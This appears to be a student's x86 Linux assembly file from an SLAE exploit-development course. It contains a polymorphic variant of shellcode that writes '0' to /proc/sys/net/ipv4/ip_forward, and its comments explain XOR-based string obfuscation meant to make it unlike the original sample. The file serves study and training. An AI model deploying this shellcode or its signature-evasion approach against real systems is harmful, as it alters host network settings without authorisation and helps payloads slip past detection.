; Filename: code1-final-polymorph.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; Purpose:
;	set /proc/sys/net/ipv4/ip_forward to 0 and exit
;
; Shellcode for code1-smaller.nasm is 68 bytes (original 83)
; 11 out of the original 31 lines are the same (35.48% similarity)
;
; However, rewriting the shellcode to be more efficient
; is probably not what was in mind when this assessment
; was set, so we will enhance this code further.
;
; After my efforts to polymorph the code even further we have
; 5/31 lines (16.13%) and 77 bytes (92.77% original size)
;
; Notes:
;	If you don't sudo the code you will SIGSEGV out
;	because open() returns -13 and write doesn't like it.
;

global _start

section .text

_start:
	xor ecx, ecx
	mul ecx

	;cdq	; mul ecx will clear edx as well
	;
	; The result is stored in register AX, register pair DX:AX, or register
	; pair EDX:EAX (depending on the operand size), with the high-order
	; bits of the product contained in register AH, DX, or EDX, respectively.
	; If the high-order bits of the product are 0, the CF and OF flags are
	; cleared; otherwise, the flags are set.

	push edx			; null

	; /proc/sys/net/ipv4/ip_forward
	mov ebx, 0x64726177		; draw (same byte vals but not a push)
	push ebx

	xor ebx, 0x161d0728		; 0x64726177 xor 0x161d0728 = 0x726f665f (rof_)
	push ebx

	xor ebx, 0x0206496b		; 0x726f665f xor 0x0206496b = 0x70692f34 (pi/4)
	push ebx

	xor ebx, 0x0619461b		; 0x70692f34 xor 0x0619461b = 0x7670692f (vpi/)
	push ebx

	;
	; We can't XOR vpi/ and ten/ because they both end in / and that would
	; cause us some grief in 0x00 bytes :) So we will use some maths instead
	;
	sub ebx, 0x020afb01
	inc ebx

	push ebx

	push 0x7379732f			; sys/
	push 0x636f7270			; corp
	push 0x2f2f2f2f			; ////

	mov ebx, esp			; [SAME] EBX now points to argument

	add al, 0x05			; open( /proc/sys/net/ipv4/ip_forward )
	inc ecx				; O_WRONLY
	int 0x80			; [SAME]

	xchg ebx, eax			; Shorter than mov ebx, eax

	push 0x30			; [SAME] Ascii 0

	mov ecx, esp			; [SAME] ECX points to stack

	inc edx				; instead of mov dl, 0x01

	xor eax, eax			; Because it currently points at the stack!
	add eax, 0x04			; write()
	int 0x80			; [SAME]

	int 0x80			; Not considered same because it is at a
					; completely different location. As noted
					; in code1-smaller this is calling exit.
